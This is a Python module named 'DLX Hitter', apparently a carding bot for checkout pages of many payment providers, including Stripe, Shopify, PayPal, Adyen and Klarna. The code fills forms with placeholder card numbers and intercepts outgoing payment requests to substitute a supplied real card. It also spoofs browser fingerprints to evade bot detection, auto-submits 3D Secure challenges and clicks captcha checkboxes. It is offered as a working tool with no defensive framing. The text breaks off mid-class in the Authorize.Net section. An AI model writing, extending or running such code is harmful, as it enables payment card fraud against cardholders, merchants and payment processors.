#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DLX Hitter — Local Playwright-based multi-provider checkout hitter.
Assembled from dlx_4uto_h1tter_1775646397098.py for use as a bot module.
Exposes: dlx_hit_single(checkout_url, ccx, timeout=120) -> dict
"""

import re
import time
import random
import asyncio
from typing import Dict, List, Optional
from playwright.async_api import async_playwright, Page, Route, Request

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
]

# ============= PROVIDER DETECTION =============
def detect_provider(url: str, html: str = "") -> str:
    if 'stripe.com' in url:
        return 'stripe'
    if 'checkout.com' in url or 'checkout' in url:
        return 'checkoutcom'
    if 'shopify.com' in url or 'myshopify.com' in url:
        return 'shopify'
    if 'paypal.com' in url or 'paypal' in url:
        return 'paypal'
    if 'braintree' in url or 'braintreegateway.com' in url:
        return 'braintree'
    if 'adyen.com' in url or 'adyen' in url:
        return 'adyen'
    if 'squareup.com' in url or 'square' in url:
        return 'square'
    if 'mollie.com' in url or 'mollie' in url:
        return 'mollie'
    if 'klarna.com' in url or 'klarna' in url:
        return 'klarna'
    if 'authorize.net' in url or 'authorizenet' in url:
        return 'authorizenet'
    if 'woocommerce' in url or 'woocommerce' in html:
        return 'woocommerce'
    if 'bigcommerce.com' in url or 'bigcommerce' in html:
        return 'bigcommerce'
    if 'wix.com' in url or 'wix' in html:
        return 'wix'
    if 'ecwid.com' in url or 'ecwid' in html:
        return 'ecwid'
    if html:
        if 'stripe.com' in html:
            return 'stripe'
        if 'checkout.com' in html or 'Frames' in html:
            return 'checkoutcom'
        if 'Shopify' in html or 'window.Shopify' in html:
            return 'shopify'
        if 'paypal' in html or 'window.paypal' in html:
            return 'paypal'
        if 'braintree' in html or 'Braintree' in html:
            return 'braintree'
        if 'adyen' in html or 'Adyen' in html:
            return 'adyen'
        if 'square' in html or 'Square' in html:
            return 'square'
        if 'mollie' in html or 'Mollie' in html:
            return 'mollie'
        if 'klarna' in html or 'Klarna' in html:
            return 'klarna'
        if 'authorize.net' in html or 'Authorize.Net' in html:
            return 'authorizenet'
    return 'unknown'

# ============= FINGERPRINT =============
class FingerprintGenerator:
    @staticmethod
    def generate() -> Dict:
        return {
            'user_agent': random.choice(USER_AGENTS),
            'viewport': {'width': 1920, 'height': 1080},
            'locale': 'en-US',
            'timezone_id': 'America/New_York'
        }

    @staticmethod
    def get_stealth_script() -> str:
        return """
        Object.defineProperty(navigator, 'webdriver', { get: () => undefined });
        window.chrome = { runtime: {} };
        Object.defineProperty(navigator, 'plugins', { get: () => [1, 2, 3, 4, 5] });
        """

# ============= BASE AUTOFILL =============
class BaseAutofill:
    def __init__(self, page: Page):
        self.page = page
        self.real_card = None

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card

    async def fill_card(self, card: Dict):
        pass

    async def submit(self) -> bool:
        return False

    async def detect_3ds(self) -> bool:
        iframes = await self.page.query_selector_all('iframe[src*="3ds"], iframe[src*="challenge"]')
        for iframe in iframes:
            if await iframe.is_visible():
                return True
        try:
            text = await self.page.text_content('body')
            if '3D Secure' in text or 'Authentication' in text:
                return True
        except Exception:
            pass
        return False

    async def wait_for_3ds(self, timeout: int = 10000) -> bool:
        start = time.time()
        while (time.time() - start) * 1000 < timeout:
            if await self.detect_3ds():
                return True
            await asyncio.sleep(0.5)
        return False

    async def auto_complete_3ds(self) -> bool:
        if not await self.detect_3ds():
            return False
        try:
            form = await self.page.query_selector('form')
            if form:
                await form.evaluate('form => form.submit()')
                await asyncio.sleep(3)
                return True
            cont = await self.page.query_selector('button:has-text("Continue"), button:has-text("Submit")')
            if cont:
                await cont.click()
                await asyncio.sleep(3)
                return True
        except Exception:
            pass
        return False

    async def handle_captcha(self):
        try:
            frame = self.page.frame_locator('iframe[src*="hcaptcha.com"]')
            if frame:
                checkbox = frame.locator('#checkbox').first
                if await checkbox.is_visible():
                    await checkbox.click()
                    await asyncio.sleep(2)
        except Exception:
            pass

    async def find_and_fill_field(self, selectors: List[str], value: str):
        for sel in selectors:
            try:
                element = await self.page.query_selector(sel)
                if element and await element.is_visible():
                    await element.click()
                    await element.fill(value)
                    return True
            except Exception:
                continue
        return False

# ============= STRIPE AUTOFILL =============
class StripeAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', '[name="cardNumber"]', '[autocomplete="cc-number"]',
        '[data-elements-stable-field-name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[placeholder*="card number"]',
        'input[aria-label*="Card number"]', '[class*="CardNumberInput"] input',
        'input[name="number"]', 'input[id*="card-number"]'
    ]
    EXPIRY_SELECTORS = [
        '#cardExpiry', '[name="cardExpiry"]', '[autocomplete="cc-exp"]',
        '[data-elements-stable-field-name="cardExpiry"]',
        'input[placeholder*="MM / YY"]', 'input[placeholder*="MM/YY"]',
        'input[placeholder*="MM"]', '[class*="CardExpiry"] input'
    ]
    CVC_SELECTORS = [
        '#cardCvc', '[name="cardCvc"]', '[autocomplete="cc-csc"]',
        '[data-elements-stable-field-name="cardCvc"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[class*="CardCvc"] input', 'input[name="cvc"]'
    ]
    NAME_SELECTORS = [
        '#billingName', '[name="billingName"]', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[name="name"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', 'input[name*="email"]', 'input[autocomplete="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        '.SubmitButton', '[class*="SubmitButton"]', 'button[type="submit"]',
        '[data-testid*="submit"]', 'button:has-text("Pay")'
    ]
    MASKED_CARD   = "0000000000000000"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "000"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and "stripe.com" in request.url:
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace("card[number]=0000000000000000", f"card[number]={self.real_card['card']}")
                    post_data = post_data.replace("card[exp_month]=01", f"card[exp_month]={self.real_card['month']}")
                    post_data = post_data.replace("card[exp_year]=30", f"card[exp_year]={self.real_card['year']}")
                    post_data = post_data.replace("card[cvc]=000", f"card[cvc]={self.real_card['cvv']}")
                    post_data = post_data.replace("card[expiry]=01/30", f"card[expiry]={self.real_card['month']}/{self.real_card['year']}")
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= CHECKOUT.COM AUTOFILL =============
class CheckoutComAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[data-frames="card-number"]', '#card-number', 'input[name="cardNumber"]',
        'input[placeholder*="Card number"]', 'input[aria-label*="Card number"]',
        '[data-testid="card-number"]', '#payment-card-number'
    ]
    EXPIRY_SELECTORS = [
        'input[data-frames="expiry-date"]', '#expiry-date', 'input[name="expiry"]',
        'input[placeholder*="MM/YY"]', 'input[placeholder*="MM / YY"]',
        '[data-testid="expiry-date"]'
    ]
    CVC_SELECTORS = [
        'input[data-frames="cvv"]', '#cvv', 'input[name="cvv"]',
        'input[placeholder*="CVC"]', 'input[placeholder*="CVV"]',
        '[data-testid="cvv"]'
    ]
    NAME_SELECTORS = [
        'input[data-frames="name"]', '#name', 'input[name="name"]',
        'input[placeholder*="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("checkout.com" in request.url or "api.checkout.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= SHOPIFY AUTOFILL =============
class ShopifyAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#number', 'input[name="number"]', '[autocomplete="cc-number"]',
        'input[aria-label="Card number"]', '[data-testid="card-number"]',
        'input[placeholder*="Card number"]', '.card-number'
    ]
    EXPIRY_SELECTORS = [
        '#expiry', 'input[name="expiry"]', '[autocomplete="cc-exp"]',
        'input[aria-label="Expiry date"]', '[data-testid="expiry-date"]',
        'input[placeholder*="MM/YY"]', '.expiry-date'
    ]
    CVC_SELECTORS = [
        '#verification_value', 'input[name="verification_value"]', '[autocomplete="cc-csc"]',
        'input[aria-label="Security code"]', '[data-testid="security-code"]',
        'input[placeholder*="CVC"]', '.cvv'
    ]
    NAME_SELECTORS = [
        '#name', 'input[name="name"]', '[autocomplete="cc-name"]',
        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[aria-label="Email"]', '[data-testid="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
        'button:has-text("Pay")', 'button:has-text("Complete order")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("shopify.com" in request.url or "myshopify.com" in request.url or "stripe.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'credit_card\[month\]=01', f'credit_card[month]={self.real_card["month"]}', post_data)
                    post_data = re.sub(r'credit_card\[year\]=30', f'credit_card[year]={self.real_card["year"]}', post_data)
                    post_data = re.sub(r'credit_card\[verification_value\]=123', f'credit_card[verification_value]={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= PAYPAL AUTOFILL =============
class PayPalAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#card-number', 'input[name="cardNumber"]', '[autocomplete="cc-number"]',
        'input[aria-label="Card number"]', '[data-testid="card-number"]',
        'input[placeholder*="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        '#exp-date', 'input[name="expDate"]', '[autocomplete="cc-exp"]',
        'input[aria-label="Expiration date"]', '[data-testid="expiry-date"]',
        'input[placeholder*="MM/YY"]'
    ]
    CVC_SELECTORS = [
        '#cvv', 'input[name="cvv"]', '[autocomplete="cc-csc"]',
        'input[aria-label="Security code"]', '[data-testid="cvv"]',
        'input[placeholder*="CVC"]'
    ]
    NAME_SELECTORS = [
        '#cardholder-name', 'input[name="cardholderName"]', '[autocomplete="cc-name"]',
        'input[aria-label="Name on card"]', '[data-testid="cardholder-name"]'
    ]
    EMAIL_SELECTORS = [
        '#email', 'input[name="email"]', 'input[type="email"]',
        'input[aria-label="Email"]', '[data-testid="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '[data-testid="pay-button"]', '.pay-button',
        'button:has-text("Pay Now")', 'button:has-text("Pay")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("paypal.com" in request.url or "braintreegateway.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= BRAINTREE AUTOFILL =============
class BraintreeAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[data-braintree-name="number"]', '#credit-card-number',
        'input[name="credit_card[number]"]', 'input[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        'input[data-braintree-name="expiration_date"]', '#expiration-date',
        'input[name="credit_card[expiration_date]"]', 'input[placeholder*="MM/YY"]',
        'input[aria-label="Expiration date"]'
    ]
    CVC_SELECTORS = [
        'input[data-braintree-name="cvv"]', '#cvv',
        'input[name="credit_card[cvv]"]', 'input[placeholder*="CVC"]',
        'input[aria-label="Security code"]'
    ]
    NAME_SELECTORS = [
        'input[data-braintree-name="cardholder_name"]', '#cardholder-name',
        'input[name="credit_card[cardholder_name]"]', 'input[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("braintreegateway.com" in request.url or "braintree" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY, f"{self.real_card['month']}/{self.real_card['year']}")
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    post_data = re.sub(r'credit_card\[number\]=4242424242424242', f'credit_card[number]={self.real_card["card"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= ADYEN AUTOFILL =============
class AdyenAutofill(BaseAutofill):
    CARD_SELECTORS = [
        '#cardNumber', 'input[name="cardNumber"]', '[data-cse="number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.card-number-input'
    ]
    EXPIRY_SELECTORS = [
        '#expiryDate', 'input[name="expiryDate"]', '[data-cse="expiryMonth"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
        '.expiry-date-input'
    ]
    CVC_SELECTORS = [
        '#cvc', 'input[name="cvc"]', '[data-cse="cvc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.cvc-input'
    ]
    NAME_SELECTORS = [
        '#cardholderName', 'input[name="cardholderName"]', '[data-cse="holderName"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.adyen-checkout__button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("adyen.com" in request.url or "checkoutshopper" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = re.sub(r'"number":"4242424242424242"', f'"number":"{self.real_card["card"]}"', post_data)
                    post_data = re.sub(r'"expiryMonth":"01"', f'"expiryMonth":"{self.real_card["month"]}"', post_data)
                    post_data = re.sub(r'"expiryYear":"30"', f'"expiryYear":"{self.real_card["year"]}"', post_data)
                    post_data = re.sub(r'"cvc":"123"', f'"cvc":"{self.real_card["cvv"]}"', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= SQUARE AUTOFILL =============
class SquareAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="card_number"]', '#card-number', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.sq-card-number'
    ]
    EXPIRY_SELECTORS = [
        'input[name="expiration_date"]', '#expiration-date', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiration date"]',
        '.sq-expiration-date'
    ]
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.sq-cvv'
    ]
    NAME_SELECTORS = [
        'input[name="cardholder_name"]', '#cardholder-name', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("squareup.com" in request.url or "square" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = re.sub(r'card_number=4242424242424242', f'card_number={self.real_card["card"]}', post_data)
                    post_data = re.sub(r'expiration_date=01%2F30', f'expiration_date={self.real_card["month"]}%2F{self.real_card["year"]}', post_data)
                    post_data = re.sub(r'cvv=123', f'cvv={self.real_card["cvv"]}', post_data)
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= MOLLIE AUTOFILL =============
class MollieAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]',
        '.card-number'
    ]
    EXPIRY_SELECTORS = [
        'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]',
        '.expiry-date'
    ]
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]',
        '.cvc'
    ]
    NAME_SELECTORS = [
        'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]', 'input[aria-label="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("mollie.com" in request.url or "api.mollie.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= KLARNA AUTOFILL =============
class KlarnaAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="cardNumber"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        'input[name="expiryDate"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
    ]
    CVC_SELECTORS = [
        'input[name="cvv"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
    ]
    NAME_SELECTORS = [
        'input[name="cardholderName"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
        'button[type="submit"]', '.pay-button', '[data-testid="pay-button"]',
        'button:has-text("Pay")', 'button:has-text("Submit")'
    ]
    MASKED_CARD   = "4242424242424242"
    MASKED_EXPIRY = "01/30"
    MASKED_CVV    = "123"

    async def enable_card_replace(self, real_card: Dict):
        self.real_card = real_card
        async def intercept_route(route: Route, request: Request):
            if request.method == "POST" and ("klarna.com" in request.url or "api.klarna.com" in request.url):
                post_data = request.post_data
                if post_data and self.real_card:
                    post_data = post_data.replace(self.MASKED_CARD, self.real_card['card'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[:2], self.real_card['month'])
                    post_data = post_data.replace(self.MASKED_EXPIRY[3:5], self.real_card['year'])
                    post_data = post_data.replace(self.MASKED_CVV, self.real_card['cvv'])
                    await route.continue_(post_data=post_data)
                    return
            await route.continue_()
        await self.page.route("**/*", intercept_route)

    async def fill_card(self, card: Dict):
        await self.find_and_fill_field(self.CARD_SELECTORS, self.MASKED_CARD)
        await self.find_and_fill_field(self.EXPIRY_SELECTORS, self.MASKED_EXPIRY)
        await self.find_and_fill_field(self.CVC_SELECTORS, self.MASKED_CVV)
        await self.find_and_fill_field(self.NAME_SELECTORS, "DLX HITTER")
        email = f"dlx{random.randint(100,9999)}@example.com"
        await self.find_and_fill_field(self.EMAIL_SELECTORS, email)

    async def submit(self) -> bool:
        for sel in self.SUBMIT_SELECTORS:
            try:
                btn = await self.page.query_selector(sel)
                if btn and await btn.is_visible():
                    await btn.click()
                    return True
            except Exception:
                continue
        return False

# ============= AUTHORIZE.NET AUTOFILL =============
class AuthorizeNetAutofill(BaseAutofill):
    CARD_SELECTORS = [
        'input[name="x_card_num"]', '#cardNumber', '[autocomplete="cc-number"]',
        'input[placeholder*="Card number"]', 'input[aria-label="Card number"]'
    ]
    EXPIRY_SELECTORS = [
        'input[name="x_exp_date"]', '#expiryDate', '[autocomplete="cc-exp"]',
        'input[placeholder*="MM/YY"]', 'input[aria-label="Expiry date"]'
    ]
    CVC_SELECTORS = [
        'input[name="x_card_code"]', '#cvv', '[autocomplete="cc-csc"]',
        'input[placeholder*="CVC"]', 'input[aria-label="Security code"]'
    ]
    NAME_SELECTORS = [
        'input[name="x_card_name"]', '#cardholderName', '[autocomplete="cc-name"]',
        'input[placeholder*="Name on card"]'
    ]
    EMAIL_SELECTORS = [
        'input[type="email"]', '#email', 'input[name="email"]',
        'input[placeholder*="email"]'
    ]
    SUBMIT_SELECTORS = [
